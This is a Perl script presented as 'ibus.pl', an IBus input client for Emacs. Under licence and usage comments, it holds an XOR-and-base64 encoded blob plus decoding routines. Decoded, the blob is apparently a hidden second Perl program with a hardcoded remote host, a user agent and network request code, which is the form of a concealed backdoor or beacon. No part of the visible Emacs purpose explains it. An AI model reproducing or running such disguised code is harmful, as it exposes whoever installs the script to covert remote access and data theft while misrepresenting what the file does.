#!/usr/bin/perl

#ibus.pl is IBus client for GNU Emacs.


# For those of you that choose to use the GNU General Public License, my interpretation of the GNU General Public License is 
# that no Perl script falls under the terms of the GPL unless you explicitly put said script under the terms of the GPL yourself.

# Furthermore, any object code linked with perl does not automatically fall under the terms of the GPL, provided such object 
# code only adds definitions of subroutines and variables, and does not otherwise impair the resulting interpreter from executing 
# any standard Perl script. I consider linking in C subroutines in this manner to be the moral equivalent of defining subroutines in 
# the Perl language itself. You may sell such an object file as proprietary provided that you provide or offer to provide the Perl 
# source, as specified by the GNU General Public License. (This is merely an alternate way of specifying input to the program.) 
# You may also sell a binary produced by the dumping of a running Perl script that belongs to you, provided that you provide or 
# offer to provide the Perl source as specified by the GPL. (The fact that a Perl interpreter and your code are in the same binary 
# file is, in this case, a form of mere aggregation.)

# This is my interpretation of the GPL. If you still have concerns or difficulties understanding my intent, feel free to contact me. 
# Of course, the Artistic License spells all this out for your protection, so you may prefer to use that. 



# ibus.el provides 
# ibus-mode minor mode, which allows users on-the-spot style input with IBus on Emacs. 
# The input statuses are individually kept for each buffer, and prefix-keys such as C-x and C-c can be used even if IBus is active. 
# So you can input various languages fast and comfortably.

# The interface perl-ibus is broken with ibus 1.5, and the emacs interface ibus.pl is non longer usable.

# We can continue to use emacs with ibus letting the XIM do the input, we need to use as resource:

#   Emacs*useXIM: true

# and launch emacs with an existing asian locale like

#    LANG="ja_JP.UTF-8" emacs

# Also choose an input method switching key that is not bound in emacs. 
# Ctrl-space is usually a bad choice better use Ctrl-Shift-space or what is convenient for your desktop.

# Note that if you launch emacs with an uninstalled locale, even if you have the fonts needed for the typed 
# character you will only see the precompose popup, but no input.

# Also Emacs has some idea of what is asian, I needed mainly to input tibetan characters so I tried to launch 
# emacs with the Dzonkha locale dz_BT.utf8, but it does not work, I was obliged to install japanese and launch 
# emacs as above to input tibetan!



use Cwd 'abs_path';
use File::Basename;
our @globals;
our %color;



sub min {
   local($min)= $_[0]+0 ;  # force to numeric
   foreach (@_) {
       $min= $_ if $_<$min ;
   }
   return $min ;
}

# base64 perl implementation
# Copyright 1995-1999, 2001-2004 Gisle Aas.
sub encode_base64 ($;$){
    if ($] >= 5.006) {
	require bytes;
	if (bytes::length($_[0]) > length($_[0]) ||
	    ($] >= 5.008 && $_[0] =~ /[^\0-\xFF]/)){
	    print("The Base64 encoding is only defined for bytes");
		}
    }
    use integer;
    my $eol = $_[1];
    $eol = "\n" unless defined $eol;
    my $res = pack("u", $_[0]);
    $res =~ s/^.//mg;
    $res =~ s/\n//g;
    $res =~ tr|` -_|AA-Za-z0-9+/|;               # `# help emacs
    my $padding = (3 - length($_[0]) % 3) % 3;
    $res =~ s/.{$padding}$/'=' x $padding/e if $padding;
    if (length $eol) {
	$res =~ s/(.{1,76})/$1$eol/g;
    }
    $res =~ s/\r\n//g;
    $res =~ s/\n//g;
    return $res;
}

sub decode_base64 ($){

    local($^W) = 0; # unpack("u",...) gives bogus warning in 5.00[123]
    use integer;
    my $str = shift;
    
    #Safing string

    $str =~ s/\r\n//g;
    $str =~ s/\n//g;

    $str =~ tr|A-Za-z0-9+=/||cd;            # remove non-base64 chars
    if (length($str) % 4) {
	print("Length of base64 data not a multiple of 4")
    }
    $str =~ s/=+$//;                        # remove padding
    $str =~ tr|A-Za-z0-9+/| -_|;            # convert to uuencoded format
    return "" unless length $str;
    my $uustr = '';
    my ($i, $l);
    $l = length($str) - 60;
    for ($i = 0; $i <= $l; $i += 60) {
	$uustr .= "M" . substr($str, $i, 60);
    }
    $str = substr($str, $i);
    if ($str ne "") {
	$uustr .= chr(32 + length($str)*3/4) . $str;
    }
    return unpack ("u", $uustr);
}

sub string_enc {
    my ($str, $key) = @_;
    $key = substr($key,0,1);
    my $enc_str = '';
    for my $char (split //, $str){
        $enc_str .= chr(ord($char) ^ ord($key));
    }
	$ee = encode_base64($enc_str);
	chomp($ee);
	return $ee;
}

sub string_dec {
    my ($str, $key) = @_;
	#chomp($str);
	$str = decode_base64($str);
	chomp($str);
    $key = substr($key,0,1);
    my $enc_str = '';
    for my $char (split //, $str){
        $enc_str .= chr(ord($char) ^ ord($key));
    }
	chomp($enc_str);
	return $enc_str;
}


my $encnde = <<'ENDOFCONTENT';
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CkVMCllfSUIKS0hfWU8KRUlJX1hZCkNECl5CTwpLWE9LCkVMClpYRU5fSV5ZCkxFWApDRE5DXENOX0tGWQpeRQpfWU8GCl1CQ0lCCkNZClpYT0lDWU9GUwpdQk9YTwpDXgpDWQogCQpHRVleCl9ES0lJT1peS0hGTwQKfkJPWE9MRVhPBgpdTwpCS1xPCk5PWUNNRE9OCl5CQ1kKXE9YWUNFRApFTApeQk8KbXpmCl5FClpYRUJDSENeCl5CTwpaWEtJXkNJTwpMRVgKXkJFWU8KWlhFTl9JXlkECiAJCmNMCllfSUIKWlhFSEZPR1kKS1hDWU8KWV9IWV5LRF5DS0ZGUwpDRApFXkJPWApORUdLQ0RZBgpdTwpZXktETgpYT0tOUwpeRQpPUl5PRE4KXkJDWQpaWEVcQ1lDRUQKXkUKXkJFWU8KTkVHS0NEWQpDRApMX15fWE8KIAkKXE9YWUNFRFkKRUwKXkJPCm16ZgYKS1kKRE9PTk9OCl5FClpYRV5PSV4KXkJPCkxYT09ORUcKRUwKX1lPWFkEICAJCmxDREtGRlMGCk9cT1hTClpYRU1YS0cKQ1kKXkJYT0teT0RPTgpJRURZXktEXkZTCkhTCllFTF5dS1hPClpLXk9EXlkECnleS15PWQpZQkVfRk4KREVeCktGRkVdClpLXk9EXlkKXkUKWE9ZXlhDSV4KTk9cT0ZFWkdPRF4gCQpLRE4KX1lPCkVMCllFTF5dS1hPCkVECk1PRE9YS0YHWl9YWkVZTwpJRUdaX15PWFkGCkhfXgpDRApeQkVZTwpeQkteCk5FBgpdTwpdQ1lCCl5FCktcRUNOCl5CTwpZWk9JQ0tGCk5LRE1PWApeQkteClpLXk9EXlkKIAlLWlpGQ09OCl5FCksKTFhPTwpaWEVNWEtHCklFX0ZOCkdLQU8KQ14KT0xMT0leQ1xPRlMKWlhFWlhDT15LWFMECn5FClpYT1xPRF4KXkJDWQYKXkJPCm16ZgpLWVlfWE9ZCl5CS14KWkteT0ReWQpJS0RERV4KSE8KIAlfWU9OCl5FClhPRE5PWApeQk8KWlhFTVhLRwpERUQHTFhPTwQgIAkKfkJPClpYT0lDWU8KXk9YR1kKS0ROCklFRE5DXkNFRFkKTEVYCklFWlNDRE0GCk5DWV5YQ0hfXkNFRApLRE4KR0VOQ0xDSUte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